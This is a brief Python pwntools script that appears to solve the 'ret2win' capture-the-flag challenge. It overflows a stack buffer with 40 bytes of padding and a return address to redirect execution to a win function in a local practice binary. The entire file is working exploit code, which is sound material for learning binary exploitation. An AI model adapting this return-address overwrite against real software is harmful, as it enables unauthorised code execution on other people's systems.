#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ret2win')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

payload = (
    b"A" * 40 +
    p64(0x400824)
)

io.sendline(payload)
io.interactive()

